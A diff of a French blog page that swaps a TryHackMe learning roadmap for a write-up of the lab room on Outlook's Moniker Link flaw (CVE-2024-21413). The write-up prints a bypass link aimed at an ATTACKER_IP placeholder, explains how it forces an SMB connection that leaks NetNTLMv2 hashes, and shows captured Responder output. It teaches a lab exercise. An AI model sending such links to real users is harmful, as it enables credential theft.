@@ -115,98 +115,90 @@
                     <div class="container">
                         <div class="row justify-content-center">
                             <div class="col-lg-8">
-                                <h2>Roadmap TryHackMe - Progression en cybersécurité</h2>
+                                <h1>Room TryHackMe - Moniker Link (CVE-2024-21413)</h1>
+
+                                <h2>Contexte</h2>
                                 <p>
-                                    Cette roadmap a pour objectif de guider l’apprentissage progressif sur TryHackMe, depuis les bases jusqu’à l’acquisition de compétences en pentesting, en exploitant les parcours proposés par la plateforme. Elle est structurée en différentes phases : débutant, intermédiaire, avancé, chacune accompagnée d’exercices et de challenges adaptés. L’objectif est d’atteindre un niveau solide pour participer à des CTF et maîtriser les compétences nécessaires pour évoluer professionnellement dans la cybersécurité offensive.
+                                    Cette room TryHackMe est centrée sur l’exploitation de la faille critique CVE-2024-21413. Cette vulnérabilité affecte Microsoft Outlook et permet à un attaquant de forcer l’ouverture d’un fichier distant via un lien spécial (moniker), contournant la Protected View. Le but de la room est de comprendre le fonctionnement des monikers, comment les détourner, et de capturer les identifiants de la victime via une attaque SMB.
                                 </p>
 
-                                <hr>
-
-                                <h3>Étape 1 — Fondations essentielles</h3>
-                                <p>
-                                    Cette première partie vise à acquérir les bases indispensables pour bien démarrer sur TryHackMe.
-                                </p>
+                                <h2>Présentation de la CVE</h2>
                                 <ul>
-                                    <li>Terminer le parcours <strong>Pre Security</strong> <br>
-                                        <img src="https://example.com/image-presecurity.png" alt="Pre Security">
-                                    </li>
-                                    <li>Compléter le parcours <strong>Cyber Defence</strong> <br>
-                                        <img src="https://example.com/image-cyberdefense.png" alt="Cyber Defence">
-                                    </li>
+                                    <li>Date de publication : 13 février 2024</li>
+                                    <li>Score CVSS : 9.8 (critique)</li>
+                                    <li>Impact : Exécution de code à distance / fuite de credentials</li>
+                                    <li>Exploitation : Faible complexité</li>
+                                    <li>Produits impactés : Microsoft Office 2016, 2019, 2021, Microsoft 365</li>
                                 </ul>
 
-                                <h3>Étape 2 — Bases du pentesting</h3>
+                                <h2>Les URL Monikers</h2>
                                 <p>
-                                    Approfondissement des techniques et outils de base utilisés en pentesting.
+                                    Les monikers sont utilisés pour accéder à des ressources externes via des protocoles comme <code>file://</code>, <code>ftp://</code> ou encore <code>ms-word://</code>. Ils sont intégrés dans les applications Microsoft (Outlook, Word…) et permettent de charger des objets COM. Cette technologie peut être abusée pour forcer l’ouverture de fichiers distants automatiquement.
                                 </p>
+                                <img src="https://example.com/image-moniker.png" alt="Exemple de moniker" style="width:60%; margin: 1em 0;" />
+
+                                <h3>Exemples de Monikers</h3>
                                 <ul>
-                                    <li>Faire l'intégralité du parcours <strong>Jr Penetration Tester</strong> <br>
-                                        <img src="https://example.com/image-jrpen.png" alt="Jr Penetration Tester">
-                                    </li>
-                                    <li>Compléter le parcours <strong>Linux</strong> pour maîtriser l’environnement terminal <br>
-                                        <img src="https://example.com/image-linux.png" alt="Linux">
-                                    </li>
-                                    <li>Terminer le parcours <strong>Network Fundamentals</strong> <br>
-                                        <img src="https://example.com/image-network.png" alt="Network Fundamentals">
-                                    </li>
-                                    <li>Travailler le module <strong>Burp Suite</strong> (très utilisé pour les tests web) <br>
-                                        <img src="https://example.com/image-burp.png" alt="Burp Suite">
-                                    </li>
+                                    <li><code>http://</code> – Accès web</li>
+                                    <li><code>file://</code> – Accès à un fichier distant</li>
+                                    <li><code>ftp://</code> – Fichier sur un serveur FTP</li>
+                                    <li><code>ms-word://</code> – Chargement via Word</li>
+                                    <li><code>outlook://</code> – Référence à un élément Outlook</li>
                                 </ul>
 
-                                <h3>Étape 3 — Développement des compétences offensives</h3>
+                                <h2>La Protected View</h2>
                                 <p>
-                                    C’est ici qu’on commence les choses sérieuses. On rentre dans les failles concrètes et les techniques de compromission.
+                                    Outlook protège l’utilisateur en ouvrant les pièces jointes dans un mode sécurisé. Toutefois, ce mécanisme peut être contourné via des monikers malformés utilisant un caractère spécial.
                                 </p>
-                                <ul>
-                                    <li>Suivre les modules :
-                                    <ul>
-                                        <li><strong>Intro to Offensive Security</strong></li>
-                                        <li><strong>Enumeration</strong></li>
-                                        <li><strong>Initial Access</strong></li>
-                                        <li><strong>Privilege Escalation</strong></li>
-                                        <li><strong>Persistence</strong></li>
-                                        <li><strong>Active Directory</strong></li>
-                                    </ul>
-                                    <img src="https://example.com/image-offensive.png" alt="Offensive Modules">
-                                    </li>
-                                </ul>
 
-                                <h3>Étape 4 — Entraînement via les CTF</h3>
-                                <p>
-                                    Une fois les compétences de base bien assimilées, il est important de les mettre en pratique sur des machines réelles.
-                                </p>
-                                <ul>
-                                    <li>Compléter les rooms « easy » de la section <strong>Offensive Pentesting</strong></li>
-                                    <li>Travailler régulièrement sur des machines dans la catégorie <strong>CTF</strong></li>
-                                    <li>Participer à des événements CTF proposés par la plateforme</li>
-                                    <li>Commencer à prendre des notes (via Obsidian, HackMD, ou autre)</li>
-                                </ul>
+                                <h3>Lien bloqué par la Protected View</h3>
+                                <pre><code>&lt;a href="file://ATTACKER_IP/test"&gt;Click me&lt;/a&gt;</code></pre>
 
-                                <h3>Étape 5 — Approfondissement et spécialisation</h3>
-                                <p>
-                                    Une fois un bon rythme atteint, l’idée est de spécialiser certaines connaissances et d’augmenter en niveau.
-                                </p>
-                                <ul>
-                                    <li>Faire les modules de la catégorie <strong>Red Team</strong></li>
-                                    <li>Travailler les machines <strong>Medium</strong> en autonomie</li>
-                                    <li>Commencer à travailler sur HackTheBox ou d’autres plateformes (PortSwigger, RootMe...)</li>
-                                </ul>
+                                <h3>Lien permettant de bypass</h3>
+                                <pre><code>&lt;a href="file://ATTACKER_IP/test!exploit"&gt;Click me&lt;/a&gt;</code></pre>
 
-                                <h3>Étape 6 — Construction d’un portfolio / passage à la pratique pro</h3>
                                 <p>
-                                    Cette dernière étape vise à concrétiser les compétences acquises pour les valoriser.
+                                    Ce lien déclenche une connexion SMB vers la machine de l’attaquant, permettant la capture d’un hash NetNTLMv2.
+                                </p>
+                                <img src="https://example.com/image-link-exploit.png" alt="Lien malveillant" style="width:60%; margin: 1em 0;" />
+
+                                <h2>Exploitation</h2>
+                                <p>
+                                    Pour exploiter la faille, un script Python est utilisé pour envoyer un e-mail avec le lien malveillant. Il faut modifier deux éléments :
                                 </p>
                                 <ul>
-                                    <li>Créer un petit blog ou un espace pour partager ses write-ups</li>
-                                    <li>Documenter ses techniques et ses trouvailles</li>
-                                    <li>Partager ses progrès sur LinkedIn ou Twitter pour se faire remarquer</li>
-                                    <li>Contribuer à la communauté (Discord, forums, etc.)</li>
+                                    <li>Mettre votre propre IP dans le lien Moniker</li>
+                                    <li>Utiliser l’adresse SMTP de la machine cible</li>
                                 </ul>
+                                <img src="https://example.com/image-script-mail.png" alt="Script d'envoi d'e-mail" style="width:60%; margin: 1em 0;" />
+
+                                <p>
+                                    Une fois le mail reçu, si l’utilisateur clique sur le lien, sa machine tente d’accéder au fichier, ce qui déclenche une requête SMB interceptée par Responder ou Inveigh.
+                                </p>
+
+                                <h2>Analyse de la réponse Responder</h2>
+                                <p>
+                                    Lors de la connexion SMB, Responder capture les informations d’identification :
+                                </p>
+                                <pre>
+                                    [SMB] NTLMv2-SSP Client   : ::ffff:10.10.97.238
+                                    [SMB] NTLMv2-SSP Username : THM-MONIKERLINK\tryhackme
+                                    [SMB] NTLMv2-SSP Hash     : tryhackme::THM-MONIKERLINK:86a73f...
+                                </pre>
+                                <img src="https://example.com/image-responder.png" alt="Capture SMB via Responder" style="width:60%; margin: 1em 0;" />
+
+                                <p>
+                                    Ce hash peut ensuite être utilisé dans une attaque Pass-the-Hash ou craqué avec Hashcat ou John the Ripper.
+                                </p>
+
+                                <h2>Conclusion</h2>
+                                <p>
+                                    Cette room met en lumière la facilité avec laquelle un attaquant peut détourner une fonctionnalité légitime (monikers) pour obtenir des credentials, même sans interaction poussée de la victime. CVE-2024-21413 démontre une fois de plus la dangerosité des protocoles hérités comme SMB dans un environnement non cloisonné.
+                                </p>
                                 <h3>Vidéo explicative</h3>
-                                <div style="text-align: center;">
-                                    <iframe width="560" height="315" src="https://www.youtube.com/embed/6oXj8GPT9Zg" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-                                </div>
+                                    <div style="text-align: center;">
+                                        <iframe width="560" height="315" src="https://www.youtube.com/embed/6oXj8GPT9Zg" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+                                    </div>
                                 </div>
                             </div>
                         </div>
